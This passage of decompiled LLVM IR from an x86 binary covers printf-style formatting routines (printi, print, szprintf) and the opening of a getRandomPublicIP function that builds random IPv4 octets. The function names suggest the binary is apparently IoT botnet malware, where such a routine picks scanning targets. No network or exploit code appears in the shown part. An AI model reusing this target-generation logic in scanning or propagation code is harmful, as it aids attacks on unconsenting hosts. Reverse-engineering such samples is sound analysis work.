  %v1_804fcb8 = icmp eq i1 %v5_804fcb4, false
  br i1 %v1_804fcb8, label %dec_label_pc_804fcea, label %dec_label_pc_804fcba

dec_label_pc_804fcba:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp40 = bitcast i32* %stack_var_-16 to i8*
  %v6_804fcdd = call i32 @prints(i32 %arg1, i8* %tmp40, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_804fdd4

dec_label_pc_804fcea:                             ; preds = %entry
  %v4_804fcea = icmp eq i32 %arg4, 0
  br i1 %v4_804fcea, label %dec_label_pc_804fd0b, label %dec_label_pc_804fcf0

dec_label_pc_804fcf0:                             ; preds = %dec_label_pc_804fcea
  %v13_804fcf0 = icmp eq i32 %arg3, 10
  %v1_804fcf4 = icmp eq i1 %v13_804fcf0, false
  br i1 %v1_804fcf4, label %dec_label_pc_804fd0b, label %dec_label_pc_804fcf6

dec_label_pc_804fcf6:                             ; preds = %dec_label_pc_804fcf0
  %v1_804fcfa = icmp eq i1 %v6_804fcb4, false
  br i1 %v1_804fcfa, label %dec_label_pc_804fd0b, label %dec_label_pc_804fcfc

dec_label_pc_804fcfc:                             ; preds = %dec_label_pc_804fcf6
  %v1_804fd06 = sub i32 0, %v4_804fcae
  %v5_804fd08 = sext i32 %v1_804fd06 to i64
  br label %dec_label_pc_804fd0b

dec_label_pc_804fd0b:                             ; preds = %dec_label_pc_804fcf6, %dec_label_pc_804fcf0, %dec_label_pc_804fcea, %dec_label_pc_804fcfc
  %stack_var_-24.0 = phi i64 [ %arg2, %dec_label_pc_804fcea ], [ %arg2, %dec_label_pc_804fcf0 ], [ %arg2, %dec_label_pc_804fcf6 ], [ %v5_804fd08, %dec_label_pc_804fcfc ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_804fcea ], [ 0, %dec_label_pc_804fcf0 ], [ 0, %dec_label_pc_804fcf6 ], [ 1, %dec_label_pc_804fcfc ]
  %tmp41 = bitcast i32* %stack_var_-5 to i8*
  store i8 0, i8* %tmp41, align 4
  %v4_804fd6c6 = trunc i64 %stack_var_-24.0 to i32
  %v5_804fd6c7 = icmp eq i32 %v4_804fd6c6, 0
  %v1_804fd7014 = icmp eq i1 %v5_804fd6c7, false
  br i1 %v1_804fd7014, label %dec_label_pc_804fd1c.lr.ph, label %dec_label_pc_804fd72

dec_label_pc_804fd1c.lr.ph:                       ; preds = %dec_label_pc_804fd0b
  %v5_804fd1f = sext i32 %arg3 to i64
  br label %dec_label_pc_804fd1c

dec_label_pc_804fd1c:                             ; preds = %dec_label_pc_804fd1c.lr.ph, %dec_label_pc_804fd44
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_804fd1c.lr.ph ], [ %v5_804fd69, %dec_label_pc_804fd44 ]
  %stack_var_-40.015 = phi i8* [ %tmp41, %dec_label_pc_804fd1c.lr.ph ], [ %v22_804fd44, %dec_label_pc_804fd44 ]
  %v6_804fd2a = and i64 %stack_var_-24.116, 4294967295
  %v12_804fd2a = udiv i64 %v6_804fd2a, %v5_804fd1f
  %v13_804fd2a = trunc i64 %v12_804fd2a to i32
  %v14_804fd2a = urem i64 %v6_804fd2a, %v5_804fd1f
  %v5_804fd2f = trunc i64 %v14_804fd2a to i8
  %v7_804fd36 = icmp sgt i8 %v5_804fd2f, 9
  br i1 %v7_804fd36, label %dec_label_pc_804fd38, label %dec_label_pc_804fd44

dec_label_pc_804fd38:                             ; preds = %dec_label_pc_804fd1c
  %tmp = trunc i64 %v14_804fd2a to i32
  %v5_804fd3b = add i32 %tmp, %arg7
  %v1_804fd3e = add i32 %v5_804fd3b, 198
  %v11_804fd3e = trunc i32 %v1_804fd3e to i8
  br label %dec_label_pc_804fd44

dec_label_pc_804fd44:                             ; preds = %dec_label_pc_804fd1c, %dec_label_pc_804fd38
  %stack_var_-36.0 = phi i8 [ %v11_804fd3e, %dec_label_pc_804fd38 ], [ %v5_804fd2f, %dec_label_pc_804fd1c ]
  %v4_804fd44 = ptrtoint i8* %stack_var_-40.015 to i32
  %v5_804fd44 = add i32 %v4_804fd44, -1
  %v22_804fd44 = inttoptr i32 %v5_804fd44 to i8*
  %v2_804fd4b = add i8 %stack_var_-36.0, 48
  store i8 %v2_804fd4b, i8* %v22_804fd44, align 1
  %v5_804fd69 = sext i32 %v13_804fd2a to i64
  %v5_804fd6c = icmp eq i32 %v13_804fd2a, 0
  %v1_804fd70 = icmp eq i1 %v5_804fd6c, false
  br i1 %v1_804fd70, label %dec_label_pc_804fd1c, label %dec_label_pc_804fd72

dec_label_pc_804fd72:                             ; preds = %dec_label_pc_804fd44, %dec_label_pc_804fd0b
  %stack_var_-40.0.lcssa = phi i8* [ %tmp41, %dec_label_pc_804fd0b ], [ %v22_804fd44, %dec_label_pc_804fd44 ]
  %v4_804fd72 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_804fd72, label %dec_label_pc_804fdac, label %dec_label_pc_804fd78

dec_label_pc_804fd78:                             ; preds = %dec_label_pc_804fd72
  %v4_804fd78 = icmp eq i32 %arg5, 0
  br i1 %v4_804fd78, label %dec_label_pc_804fda3, label %dec_label_pc_804fd7e

dec_label_pc_804fd7e:                             ; preds = %dec_label_pc_804fd78
  %v1_804fd81 = and i32 %arg6, 2
  %v2_804fd81 = icmp eq i32 %v1_804fd81, 0
  br i1 %v2_804fd81, label %dec_label_pc_804fda3, label %dec_label_pc_804fd88

dec_label_pc_804fd88:                             ; preds = %dec_label_pc_804fd7e
  %v3_804fd96 = inttoptr i32 %arg1 to i32*
  %v4_804fd96 = call i32 @printchar(i32* %v3_804fd96, i32 45)
  %v4_804fd9e = add i32 %arg5, -1
  br label %dec_label_pc_804fdac

dec_label_pc_804fda3:                             ; preds = %dec_label_pc_804fd7e, %dec_label_pc_804fd78
  %v4_804fda3 = ptrtoint i8* %stack_var_-40.0.lcssa to i32
  %v5_804fda3 = add i32 %v4_804fda3, -1
  %v22_804fda3 = inttoptr i32 %v5_804fda3 to i8*
  store i8 45, i8* %v22_804fda3, align 1
  br label %dec_label_pc_804fdac

dec_label_pc_804fdac:                             ; preds = %dec_label_pc_804fd72, %dec_label_pc_804fd88, %dec_label_pc_804fda3
  %stack_var_20.0 = phi i32 [ %arg5, %dec_label_pc_804fd72 ], [ %arg5, %dec_label_pc_804fda3 ], [ %v4_804fd9e, %dec_label_pc_804fd88 ]
  %stack_var_-40.1 = phi i8* [ %stack_var_-40.0.lcssa, %dec_label_pc_804fd72 ], [ %v22_804fda3, %dec_label_pc_804fda3 ], [ %stack_var_-40.0.lcssa, %dec_label_pc_804fd88 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_804fd72 ], [ 0, %dec_label_pc_804fda3 ], [ 1, %dec_label_pc_804fd88 ]
  %v6_804fdc7 = call i32 @prints(i32 %arg1, i8* %stack_var_-40.1, i32 %stack_var_20.0, i32 %arg6)
  %v2_804fdcf = add i32 %v6_804fdc7, %stack_var_-28.0
  store i32 %v2_804fdcf, i32* @edx, align 4
  br label %dec_label_pc_804fdd4

dec_label_pc_804fdd4:                             ; preds = %dec_label_pc_804fcba, %dec_label_pc_804fdac
  %storemerge = phi i32 [ %v2_804fdcf, %dec_label_pc_804fdac ], [ %v6_804fcdd, %dec_label_pc_804fcba ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v22_804fd44, { 0, 2, 1 }
  uselistorder i8 %v5_804fd2f, { 1, 0 }
  uselistorder i64 %v6_804fd2a, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg5, { 2, 4, 1, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i64 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fdd4, { 1, 0 }
  uselistorder label %dec_label_pc_804fdac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fd44, { 1, 0 }
  uselistorder label %dec_label_pc_804fd1c, { 1, 0 }
  uselistorder label %dec_label_pc_804fd0b, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fdd9 = load i32, i32* @ebp, align 4
  store i32 %v0_804fdd9, i32* %stack_var_-4, align 4
  %v4_804fdd9 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804fdd9, i32* @ebp, align 4
  %tmp21 = bitcast i32* %stack_var_-6 to i8*
  %stack_var_8.435 = inttoptr i32 %arg2 to i8*
  %v2_805008d36 = load i8, i8* %stack_var_8.435, align 1
  %v4_805009038 = icmp eq i8 %v2_805008d36, 0
  %v1_805009240 = icmp eq i1 %v4_805009038, false
  br i1 %v1_805009240, label %dec_label_pc_804fdeb, label %dec_label_pc_8050098

dec_label_pc_804fdeb:                             ; preds = %entry, %dec_label_pc_8050087
  %stack_var_8.444 = phi i8* [ %stack_var_8.4, %dec_label_pc_8050087 ], [ %stack_var_8.435, %entry ]
  %stack_var_-28.143 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8050087 ], [ 0, %entry ]
  %stack_var_12.142 = phi i32 [ %stack_var_12.0, %dec_label_pc_8050087 ], [ %arg3, %entry ]
  %stack_var_8.4.in41 = phi i32 [ %v5_8050087, %dec_label_pc_8050087 ], [ %arg2, %entry ]
  %v2_804fdee = load i8, i8* %stack_var_8.444, align 1
  %v10_804fdf1 = icmp eq i8 %v2_804fdee, 37
  %v1_804fdf3 = icmp eq i1 %v10_804fdf1, false
  br i1 %v1_804fdf3, label %dec_label_pc_805006c, label %dec_label_pc_804fdf9

dec_label_pc_804fdf9:                             ; preds = %dec_label_pc_804fdeb
  %v5_804fdf9 = add i32 %stack_var_8.4.in41, 1
  %v22_804fdf9 = inttoptr i32 %v5_804fdf9 to i8*
  %v2_804fe0c = load i8, i8* %v22_804fdf9, align 1
  %v4_804fe0f = icmp eq i8 %v2_804fe0c, 0
  br i1 %v4_804fe0f, label %dec_label_pc_8050098, label %dec_label_pc_804fe17

dec_label_pc_804fe17:                             ; preds = %dec_label_pc_804fdf9
  %v2_804fe1a = load i8, i8* %v22_804fdf9, align 1
  %v10_804fe1d = icmp eq i8 %v2_804fe1a, 37
  br i1 %v10_804fe1d, label %dec_label_pc_805006c, label %dec_label_pc_804fe25

dec_label_pc_804fe25:                             ; preds = %dec_label_pc_804fe17
  %v2_804fe28 = load i8, i8* %v22_804fdf9, align 1
  %v10_804fe2b = icmp eq i8 %v2_804fe28, 45
  %v1_804fe2d = icmp eq i1 %v10_804fe2b, false
  br i1 %v1_804fe2d, label %dec_label_pc_804fe42.preheader, label %dec_label_pc_804fe2f

dec_label_pc_804fe2f:                             ; preds = %dec_label_pc_804fe25
  %v5_804fe2f = add i32 %stack_var_8.4.in41, 2
  %v22_804fe2f = inttoptr i32 %v5_804fe2f to i8*
  br label %dec_label_pc_804fe42.preheader

dec_label_pc_804fe42.preheader:                   ; preds = %dec_label_pc_804fe2f, %dec_label_pc_804fe25
  %stack_var_8.0.ph = phi i8* [ %v22_804fdf9, %dec_label_pc_804fe25 ], [ %v22_804fe2f, %dec_label_pc_804fe2f ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_804fe25 ], [ 1, %dec_label_pc_804fe2f ]
  %v4_804fe4222 = ptrtoint i8* %stack_var_8.0.ph to i32
  %v2_804fe4523 = load i8, i8* %stack_var_8.0.ph, align 1
  %v7_804fe4830 = icmp eq i8 %v2_804fe4523, 48
  br i1 %v7_804fe4830, label %dec_label_pc_804fe3b, label %dec_label_pc_804fe71.preheader

dec_label_pc_804fe3b:                             ; preds = %dec_label_pc_804fe42.preheader, %dec_label_pc_804fe3b
  %v4_804fe4233 = phi i32 [ %v5_804fe3b, %dec_label_pc_804fe3b ], [ %v4_804fe4222, %dec_label_pc_804fe42.preheader ]
  %stack_var_-32.032 = phi i32 [ %v4_804fe3e, %dec_label_pc_804fe3b ], [ %stack_var_-32.0.ph, %dec_label_pc_804fe42.preheader ]
  %v5_804fe3b = add i32 %v4_804fe4233, 1
  %v22_804fe3b = inttoptr i32 %v5_804fe3b to i8*
  %v4_804fe3e = or i32 %stack_var_-32.032, 2
  %v2_804fe45 = load i8, i8* %v22_804fe3b, align 1
  %v7_804fe48 = icmp eq i8 %v2_804fe45, 48
  br i1 %v7_804fe48, label %dec_label_pc_804fe3b, label %dec_label_pc_804fe71.preheader

dec_label_pc_804fe71.preheader:                   ; preds = %dec_label_pc_804fe3b, %dec_label_pc_804fe42.preheader
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_804fe42.preheader ], [ %v22_804fe3b, %dec_label_pc_804fe3b ]
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_804fe42.preheader ], [ %v4_804fe3e, %dec_label_pc_804fe3b ]
  br label %dec_label_pc_804fe71

dec_label_pc_804fe4e:                             ; preds = %dec_label_pc_804fe7b
  %v2_804fe57 = mul i32 %stack_var_-36.0, 10
  %v2_804fe5f = load i8, i8* %stack_var_8.1, align 1
  %v3_804fe5f = zext i8 %v2_804fe5f to i32
  %v5_804fe65 = add i32 %v3_804fe5f, %v2_804fe57
  %v1_804fe68 = add i32 %v5_804fe65, -48
  %v5_804fe6e = add i32 %v4_804fe71, 1
  %v22_804fe6e = inttoptr i32 %v5_804fe6e to i8*
  br label %dec_label_pc_804fe71

dec_label_pc_804fe71:                             ; preds = %dec_label_pc_804fe71.preheader, %dec_label_pc_804fe4e
  %stack_var_8.1 = phi i8* [ %v22_804fe6e, %dec_label_pc_804fe4e ], [ %stack_var_8.0.lcssa, %dec_label_pc_804fe71.preheader ]
  %stack_var_-36.0 = phi i32 [ %v1_804fe68, %dec_label_pc_804fe4e ], [ 0, %dec_label_pc_804fe71.preheader ]
  %v4_804fe71 = ptrtoint i8* %stack_var_8.1 to i32
  %v2_804fe74 = load i8, i8* %stack_var_8.1, align 1
  %tmp = icmp ult i8 %v2_804fe74, 48
  br i1 %tmp, label %dec_label_pc_804fe85, label %dec_label_pc_804fe7b

dec_label_pc_804fe7b:                             ; preds = %dec_label_pc_804fe71
  %v2_804fe7e = load i8, i8* %stack_var_8.1, align 1
  %tmp48 = icmp ult i8 %v2_804fe7e, 58
  br i1 %tmp48, label %dec_label_pc_804fe4e, label %dec_label_pc_804fe85

dec_label_pc_804fe85:                             ; preds = %dec_label_pc_804fe7b, %dec_label_pc_804fe71
  %v2_804fe88 = load i8, i8* %stack_var_8.1, align 1
  %v10_804fe8b = icmp eq i8 %v2_804fe88, 115
  %v1_804fe8d = icmp eq i1 %v10_804fe8b, false
  br i1 %v1_804fe8d, label %dec_label_pc_804fedc, label %dec_label_pc_804fe8f

dec_label_pc_804fe8f:                             ; preds = %dec_label_pc_804fe85
  %v1_804fe92 = add i32 %stack_var_12.142, 4
  %v1_804fe9a = inttoptr i32 %stack_var_12.142 to i32*
  %v2_804fe9a = load i32, i32* %v1_804fe9a, align 4
  %v4_804fe9f = icmp eq i32 %v2_804fe9a, 0
  br i1 %v4_804fe9f, label %dec_label_pc_804feb4, label %dec_label_pc_804fea5

dec_label_pc_804fea5:                             ; preds = %dec_label_pc_804fe8f
  %v5_804fea8 = inttoptr i32 %v2_804fe9a to i8*
  br label %dec_label_pc_804feb4

dec_label_pc_804feb4:                             ; preds = %dec_label_pc_804fe8f, %dec_label_pc_804fea5
  %storemerge = phi i8* [ %v5_804fea8, %dec_label_pc_804fea5 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806af48.241, i32 0, i32 0), %dec_label_pc_804fe8f ]
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_804fecf = call i32 @prints(i32 %tmp6, i8* %storemerge, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_804fed4 = add i32 %v6_804fecf, %stack_var_-28.143
  br label %dec_label_pc_8050087

dec_label_pc_804fedc:                             ; preds = %dec_label_pc_804fe85
  %v2_804fedf = load i8, i8* %stack_var_8.1, align 1
  %v10_804fee2 = icmp eq i8 %v2_804fedf, 100
  %v1_804fee4 = icmp eq i1 %v10_804fee2, false
  br i1 %v1_804fee4, label %dec_label_pc_804ff30, label %dec_label_pc_804fee6

dec_label_pc_804fee6:                             ; preds = %dec_label_pc_804fedc
  %v1_804fee9 = add i32 %stack_var_12.142, 4
  %v1_804fef1 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_804fef1 = load i32, i32* %v1_804fef1, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804ff23 = sext i32 %v2_804fef1 to i64
  %v9_804ff23 = call i32 @printi(i32 %tmp6, i64 %v8_804ff23, i32 10, i32 1, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_804ff28 = add i32 %v9_804ff23, %stack_var_-28.143
  br label %dec_label_pc_8050087

dec_label_pc_804ff30:                             ; preds = %dec_label_pc_804fedc
  %v2_804ff33 = load i8, i8* %stack_var_8.1, align 1
  %v10_804ff36 = icmp eq i8 %v2_804ff33, 120
  %v1_804ff38 = icmp eq i1 %v10_804ff36, false
  br i1 %v1_804ff38, label %dec_label_pc_804ff84, label %dec_label_pc_804ff3a

dec_label_pc_804ff3a:                             ; preds = %dec_label_pc_804ff30
  %v1_804ff3d = add i32 %stack_var_12.142, 4
  %v1_804ff45 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_804ff45 = load i32, i32* %v1_804ff45, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804ff77 = sext i32 %v2_804ff45 to i64
  %v9_804ff77 = call i32 @printi(i32 %tmp6, i64 %v8_804ff77, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_804ff7c = add i32 %v9_804ff77, %stack_var_-28.143
  br label %dec_label_pc_8050087

dec_label_pc_804ff84:                             ; preds = %dec_label_pc_804ff30
  %v2_804ff87 = load i8, i8* %stack_var_8.1, align 1
  %v10_804ff8a = icmp eq i8 %v2_804ff87, 88
  %v1_804ff8c = icmp eq i1 %v10_804ff8a, false
  br i1 %v1_804ff8c, label %dec_label_pc_804ffd8, label %dec_label_pc_804ff8e

dec_label_pc_804ff8e:                             ; preds = %dec_label_pc_804ff84
  %v1_804ff91 = add i32 %stack_var_12.142, 4
  %v1_804ff99 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_804ff99 = load i32, i32* %v1_804ff99, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804ffcb = sext i32 %v2_804ff99 to i64
  %v9_804ffcb = call i32 @printi(i32 %tmp6, i64 %v8_804ffcb, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 65)
  %v5_804ffd0 = add i32 %v9_804ffcb, %stack_var_-28.143
  br label %dec_label_pc_8050087

dec_label_pc_804ffd8:                             ; preds = %dec_label_pc_804ff84
  %v2_804ffdb = load i8, i8* %stack_var_8.1, align 1
  %v10_804ffde = icmp eq i8 %v2_804ffdb, 117
  %v1_804ffe0 = icmp eq i1 %v10_804ffde, false
  br i1 %v1_804ffe0, label %dec_label_pc_8050029, label %dec_label_pc_804ffe2

dec_label_pc_804ffe2:                             ; preds = %dec_label_pc_804ffd8
  %v1_804ffe5 = add i32 %stack_var_12.142, 4
  %v1_804ffed = inttoptr i32 %stack_var_12.142 to i32*
  %v2_804ffed = load i32, i32* %v1_804ffed, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_805001f = sext i32 %v2_804ffed to i64
  %v9_805001f = call i32 @printi(i32 %tmp6, i64 %v8_805001f, i32 10, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8050024 = add i32 %v9_805001f, %stack_var_-28.143
  br label %dec_label_pc_8050087

dec_label_pc_8050029:                             ; preds = %dec_label_pc_804ffd8
  %v2_805002c = load i8, i8* %stack_var_8.1, align 1
  %v10_805002f = icmp eq i8 %v2_805002c, 99
  %v1_8050031 = icmp eq i1 %v10_805002f, false
  br i1 %v1_8050031, label %dec_label_pc_8050087, label %dec_label_pc_8050033

dec_label_pc_8050033:                             ; preds = %dec_label_pc_8050029
  %v1_8050036 = add i32 %stack_var_12.142, 4
  %v1_805003e = inttoptr i32 %stack_var_12.142 to i32*
  %v2_805003e = load i32, i32* %v1_805003e, align 4
  store i32 %v2_805003e, i32* %stack_var_-6, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_8050062 = call i32 @prints(i32 %tmp6, i8* %tmp21, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_8050067 = add i32 %v6_8050062, %stack_var_-28.143
  br label %dec_label_pc_8050087

dec_label_pc_805006c:                             ; preds = %dec_label_pc_804fe17, %dec_label_pc_804fdeb
  %stack_var_8.2 = phi i8* [ %stack_var_8.444, %dec_label_pc_804fdeb ], [ %v22_804fdf9, %dec_label_pc_804fe17 ]
  %v2_805006f = load i8, i8* %stack_var_8.2, align 1
  %v3_805006f = zext i8 %v2_805006f to i32
  %v4_805007f = call i32 @printchar(i32* %arg1, i32 %v3_805006f)
  %v4_8050084 = add i32 %stack_var_-28.143, 1
  br label %dec_label_pc_8050087

dec_label_pc_8050087:                             ; preds = %dec_label_pc_8050029, %dec_label_pc_8050033, %dec_label_pc_804ffe2, %dec_label_pc_804ff8e, %dec_label_pc_804ff3a, %dec_label_pc_804fee6, %dec_label_pc_804feb4, %dec_label_pc_805006c
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_805006c ], [ %stack_var_8.1, %dec_label_pc_8050029 ], [ %stack_var_8.1, %dec_label_pc_8050033 ], [ %stack_var_8.1, %dec_label_pc_804ffe2 ], [ %stack_var_8.1, %dec_label_pc_804ff8e ], [ %stack_var_8.1, %dec_label_pc_804ff3a ], [ %stack_var_8.1, %dec_label_pc_804fee6 ], [ %stack_var_8.1, %dec_label_pc_804feb4 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.142, %dec_label_pc_805006c ], [ %stack_var_12.142, %dec_label_pc_8050029 ], [ %v1_8050036, %dec_label_pc_8050033 ], [ %v1_804ffe5, %dec_label_pc_804ffe2 ], [ %v1_804ff91, %dec_label_pc_804ff8e ], [ %v1_804ff3d, %dec_label_pc_804ff3a ], [ %v1_804fee9, %dec_label_pc_804fee6 ], [ %v1_804fe92, %dec_label_pc_804feb4 ]
  %stack_var_-28.0 = phi i32 [ %v4_8050084, %dec_label_pc_805006c ], [ %stack_var_-28.143, %dec_label_pc_8050029 ], [ %v5_8050067, %dec_label_pc_8050033 ], [ %v5_8050024, %dec_label_pc_804ffe2 ], [ %v5_804ffd0, %dec_label_pc_804ff8e ], [ %v5_804ff7c, %dec_label_pc_804ff3a ], [ %v5_804ff28, %dec_label_pc_804fee6 ], [ %v5_804fed4, %dec_label_pc_804feb4 ]
  %v4_8050087 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_8050087 = add i32 %v4_8050087, 1
  %stack_var_8.4 = inttoptr i32 %v5_8050087 to i8*
  %v2_805008d = load i8, i8* %stack_var_8.4, align 1
  %v4_8050090 = icmp eq i8 %v2_805008d, 0
  %v1_8050092 = icmp eq i1 %v4_8050090, false
  br i1 %v1_8050092, label %dec_label_pc_804fdeb, label %dec_label_pc_8050098

dec_label_pc_8050098:                             ; preds = %dec_label_pc_8050087, %dec_label_pc_804fdf9, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.143, %dec_label_pc_804fdf9 ], [ %stack_var_-28.0, %dec_label_pc_8050087 ]
  %v4_8050098 = icmp eq i32* %arg1, null
  br i1 %v4_8050098, label %dec_label_pc_80500a6, label %dec_label_pc_805009e

dec_label_pc_805009e:                             ; preds = %dec_label_pc_8050098
  %v2_80500a1 = load i32, i32* %arg1, align 4
  %v1_80500a3 = inttoptr i32 %v2_80500a1 to i8*
  store i8 0, i8* %v1_80500a3, align 1
  br label %dec_label_pc_80500a6

dec_label_pc_80500a6:                             ; preds = %dec_label_pc_8050098, %dec_label_pc_805009e
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_8050087, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 10, 11, 8, 9, 6, 7, 4, 5, 2, 3, 1, 0, 12 }
  uselistorder i8* %stack_var_8.1, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 16, 15, 13 }
  uselistorder i32 %v5_804fe3b, { 1, 0 }
  uselistorder i8* %v22_804fdf9, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_8.4.in41, { 1, 0 }
  uselistorder i32 %stack_var_12.142, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %stack_var_-28.143, { 0, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-6, { 1, 0 }
  uselistorder i32 %tmp6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80500a6, { 1, 0 }
  uselistorder label %dec_label_pc_8050087, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804feb4, { 1, 0 }
  uselistorder label %dec_label_pc_804fe71, { 1, 0 }
  uselistorder label %dec_label_pc_804fe3b, { 1, 0 }
  uselistorder label %dec_label_pc_804fdeb, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80500ab = load i32, i32* @ebp, align 4
  store i32 %v0_80500ab, i32* %stack_var_-4, align 4
  %v4_80500ab = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80500ab, i32* @ebp, align 4
  %v4_80500b4 = ptrtoint i32* %stack_var_12 to i32
  %v4_80500cb = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_80500b4)
  %v2_80500d0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80500d0, i32* @ebp, align 4
  ret i32 %v4_80500cb

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @getRandomPublicIP() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80500d5 = load i32, i32* @edi, align 4
  %v0_80500d6 = load i32, i32* @esi, align 4
  %v0_80500d7 = load i32, i32* @ebx, align 4
  store i32 %v0_80500d7, i32* %stack_var_-16, align 4
  %v2_80500e2 = call i32 @random()
  store i32 %v2_80500e2, i32* @ecx, align 4
  %v2_8050104 = sdiv i32 %v2_80500e2, 49
  store i32 %v2_8050104, i32* @ebx, align 4
  %tmp = mul i32 %v2_8050104, -224
  %v2_805011c = add i32 %v2_80500e2, %tmp
  %v1_8050128 = call i32 @random()
  store i32 %v1_8050128, i32* @ecx, align 4
  %v2_805014a = sdiv i32 %v1_8050128, 51
  store i32 %v2_805014a, i32* @ebx, align 4
  %tmp90 = mul i32 %v2_805014a, -255
  %v2_805015a = add i32 %v1_8050128, %tmp90
  %v1_8050166 = call i32 @random()
  store i32 %v1_8050166, i32* @ecx, align 4
  %v2_8050188 = sdiv i32 %v1_8050166, 51
  store i32 %v2_8050188, i32* @ebx, align 4
  %tmp91 = mul i32 %v2_8050188, -255
  %v2_8050198 = add i32 %v1_8050166, %tmp91
  %v1_80501a4 = call i32 @random()
  store i32 %v1_80501a4, i32* @ecx, align 4
  %v2_80501c6 = sdiv i32 %v1_80501a4, 51
  store i32 %v2_80501c6, i32* @ebx, align 4
  %tmp92 = mul i32 %v2_80501c6, -255
  %v2_80501d6 = add i32 %v1_80501a4, %tmp92
  br label %dec_label_pc_80502e7

dec_label_pc_80501e7:                             ; preds = %dec_label_pc_8050483, %dec_label_pc_805046f, %dec_label_pc_8050463, %dec_label_pc_805044f, %dec_label_pc_805043b, %dec_label_pc_805041f, %dec_label_pc_8050403, %dec_label_pc_80503ef, %dec_label_pc_80503d3, %dec_label_pc_80503b7, %dec_label_pc_80503ab, %dec_label_pc_8050397, %dec_label_pc_8050383, %dec_label_pc_8050367, %dec_label_pc_805034b, %dec_label_pc_805032f, %dec_label_pc_805031b, %dec_label_pc_805030f, %dec_label_pc_80502f3, %dec_label_pc_80502e7
  %v0_80501e7 = call i32 @random()
  store i32 %v0_80501e7, i32* @ecx, align 4
  %v2_8050209 = sdiv i32 %v0_80501e7, 49
  store i32 %v2_8050209, i32* @ebx, align 4
  %tmp93 = mul i32 %v2_8050209, -224
  %v2_8050221 = add i32 %v0_80501e7, %tmp93
  %v1_805022d = call i32 @random()
  store i32 %v1_805022d, i32* @ecx, align 4
  %v2_805024f = sdiv i32 %v1_805022d, 51
  store i32 %v2_805024f, i32* @ebx, align 4
  %tmp94 = mul i32 %v2_805024f, -255
  %v2_805025f = add i32 %v1_805022d, %tmp94
  %v1_805026b = call i32 @random()
  store i32 %v1_805026b, i32* @ecx, align 4
  %v2_805028d = sdiv i32 %v1_805026b, 51
  store i32 %v2_805028d, i32* @ebx, align 4
